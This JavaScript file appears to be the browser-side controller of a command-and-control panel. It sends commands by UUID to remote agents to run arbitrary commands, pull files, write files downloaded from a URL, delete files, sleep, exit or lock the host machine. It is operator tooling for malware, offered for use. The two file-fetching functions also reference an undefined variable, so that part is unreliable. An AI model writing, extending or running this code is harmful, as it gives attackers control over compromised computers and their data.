function sendPostRequest(req_data, req_url) {
  $.ajax({
    url: req_url,
    dataType: 'json',
    type: 'POST',
    contentType: 'application/json',
    data: JSON.stringify(req_data),
    processData: false,
    success: function (data, textStatus, jQxhr) {
      console.log('OK');
      location.reload();
    },
    error: function (jqXhr, textStatus, errorThrown) {
      console.log('FUCK');
    }
  });
}

function C2genericCommandAction(_action, _payload, _targets) {
  var _url = '/commands/' + _action;
  var data = {
    action: _action,
    payload: _payload,
    targets: _targets
  };
  sendPostRequest(data, _url);
  console.log(_action + ': [' + _payload + '] in ' + _targets);
}

function C2executeCommand(uuid, command) {
  C2genericCommandAction('STZ_EXECUTE', command, [uuid])
}

function C2executeCommandMulti(uuids, command) {
  C2genericCommandAction('STZ_EXECUTE', command, uuids)
}

function C2setValue(uuid, set_name, set_value) {
  // Format in payload is
  // "SETTING_NAME|SETTING_VALUE"
  var payload = set_name + '|' + set_value;
  C2genericCommandAction('STZ_SET', payload, [uuid])
}

function C2setValueMulti(uuids, set_name, set_value) {
  // Format in payload is
  // "SETTING_NAME|SETTING_VALUE"
  var payload = set_name + '|' + set_value;
  C2genericCommandAction('STZ_SET', payload, uuids)
}

function C2getFile(uuid, path) {
  // Format in payload is
  // "PATH_TO_GET"
  var payload = url + '|' + path;
  C2genericCommandAction('STZ_GET', payload, [uuid])
}

function C2getFileMulti(uuids, path) {
  // Format in payload is
  // "PATH_TO_GET"
  var payload = url + '|' + path;
  C2genericCommandAction('STZ_GET', payload, uuids)
}

function C2putFile(uuid, url, path) {
  // Format in payload is
  // "FILE_URL|PATH_TO_PUT"
  var payload = url + '|' + path;
  C2genericCommandAction('STZ_PUT', payload, [uuid])
}

function C2putFileMulti(uuids, url, path) {
  // Format in payload is
  // "FILE_URL|PATH_TO_PUT"
  var payload = url + '|' + path;
  C2genericCommandAction('STZ_PUT', payload, uuids)
}

function C2deleteFile(uuid, path) {
  C2genericCommandAction('STZ_DELETE', path, [uuid])
}

function C2deleteFileMulti(uuids, path) {
  C2genericCommandAction('STZ_DELETE', path, uuids)
}

function C2sleepAgent(uuid, seconds) {
  C2genericCommandAction('STZ_SLEEP', String(seconds), [uuid])
}

function C2sleepAgentMulti(uuids, seconds) {
  C2genericCommandAction('STZ_SLEEP', String(seconds), uuids)
}

function C2killAgent(uuid) {
  C2genericCommandAction('STZ_EXIT', '', [uuid])
}

function C2killAgentMulti(uuids) {
  C2genericCommandAction('STZ_EXIT', '', uuids)
}

function C2lockMachine(uuid) {
  C2genericCommandAction('STZ_LOCK', '', [uuid])
}

function C2lockMachineMulti(uuids) {
  C2genericCommandAction('STZ_LOCK', '', uuids)
}

function C2refreshData(uuid) {
  C2genericCommandAction('STZ_REGISTER', '', [uuid])
}
